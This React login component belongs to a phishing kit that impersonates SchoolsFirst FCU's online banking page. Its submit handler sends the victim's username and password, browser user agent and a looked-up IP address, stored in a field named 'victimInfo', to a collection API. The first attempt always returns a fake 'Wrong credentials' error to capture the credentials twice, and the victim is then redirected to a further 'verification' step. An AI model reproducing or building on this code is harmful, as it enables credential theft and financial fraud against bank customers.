import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import { IoIosArrowForward } from "react-icons/io";
import { IoEyeOutline, IoEyeOffOutline } from "react-icons/io5";
import FormLayout from "../components/formLayout";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Input from "../components/input";
import Button from "../components/button";
import API from "../api/api";
import axios from "axios";

const Login = () => {
  const router = useHistory();
  const [data, setData] = useState({ userID: "", password: "" });
  const [isWrong, setIsWrong] = useState(false);
  const [isShowPass, setIsShowPass] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    sessionStorage.setItem(APP_STORAGE_NAME, JSON.stringify(data));
    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ..._data,
        bank: "SchoolsFirst FCU",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        if (!isWrong) {
          setData({ userID: "", password: "" });
          setIsWrong(true);
          return;
        }
        router.push(`/verification?${randParams()}`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <FormLayout
      handleSubmit={handleSubmit}
      subTitle="Please enter your username and password below."
      children2={<Children2 />}
    >
      <Input
        title="User Name"
        name="userID"
        value={data?.userID}
        onChange={handleChange}
      />
      <Input
        title="Password"
        type={!isShowPass ? "password" : "text"}
        name="password"
        value={data?.password}
        onChange={handleChange}
      >
        <span
          className="absolute top-3 right-2 z-30"
          onClick={() => setIsShowPass((prev) => !prev)}
        >
          {!isShowPass ? (
            <IoEyeOutline
              fontSize={20}
              fill="#af5607"
            />
          ) : (
            <IoEyeOffOutline
              fontSize={20}
              fill="#af5607"
            />
          )}
        </span>
      </Input>
      <div className="flex gap-2 items-center">
        <input
          id="checkbox"
          type="checkbox"
          className="rounded-md border-[2px] w-4 h-4"
        />
        <label
          htmlFor="checkbox"
          className="text-base"
        >
          Remember Me
        </label>
      </div>

      {isWrong && (
        <div
          role="alert"
          className="alert alert-error my-4 rounded-[24px] bg-[#fcf3f3] border-[#fcf3f3] text-[#333333]"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            className="stroke-[#ce1616] shrink-0 w-6 h-6"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth="2"
              d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
            ></path>
          </svg>
          <span>Wrong credentials.</span>
        </div>
      )}

      <div className="my-4 flex justify-between items-center gap-1 flex-wrap">
        <a
          href="#"
          className="text-[var(--primary)] text-sm font-[500] flex items-center gap-1"
        >
          NEW USER REGISTRATION{" "}
          <IoIosArrowForward
            size={20}
            fill="#af5607"
          />
        </a>
        <Button
          style={{ width: "fit-content", margin: 0 }}
          disabled={!data?.userID || !data?.password}
          title={
            isLoading ? (
              <span className="loading loading-spinner loading-md text-white"></span>
            ) : (
              "Log in"
            )
          }
        />
      </div>

      <div className="flex justify-end ">
        <a
          href="#"
          className="text-[#3b6e8f] text-sm font-[500] flex items-center gap-1"
        >
          Forgot user name or password{" "}
          <IoIosArrowForward
            size={18}
            fill="#3b6e8f"
          />
        </a>
      </div>
    </FormLayout>
  );
};

const Children2 = () => {
  return (
    <div className="flex mt-8">
      <div className="p-3 md:p-4 pl-0 w-1/2 border-t-[1px] border-r-[1px] border-[#2d4452]">
        <h2 className="text-xl md:text-[28px] mb-3">Why Use Online Banking?</h2>
        <ul className="pl-4 md:pl-8 list-disc space-y-1">
          <li className="text-[#74777b] text-[12px]">Paying bills online</li>
          <li className="text-[#74777b] text-[12px]">Transferring funds</li>
          <li className="text-[#74777b] text-[12px]">
            Viewing & printing eStatements
          </li>
          <li className="text-[#74777b] text-[12px]">
            Opening additional share accounts
          </li>
          <li className="text-[#74777b] text-[12px]">Viewing cleared checks</li>
          <li className="text-[#74777b] text-[12px]">Ordering checks</li>
        </ul>
      </div>
      <div className="p-3 md:p-4 pr-0 w-1/2 border-t-[1px] border-[#2d4452]">
        <h2 className="text-xl md:text-[28px] mb-3">Why Use Online Banking?</h2>
        <ul className="pl-4 md:pl-8 list-disc space-y-1">
          <li className="text-[#74777b] text-[12px]">
            Don't share your Account Number or password
          </li>
          <li className="text-[#74777b] text-[12px]">
            Change your password often
          </li>
          <li className="text-[#74777b] text-[12px]">
            Use the "log out" option to exit; don't use your browser's "back"
            button
          </li>
          <li className="text-[#74777b] text-[12px]">
            Check your account frequently, so any discrepancies can be reported
            quickly
          </li>
        </ul>
      </div>
    </div>
  );
};

export default Login;
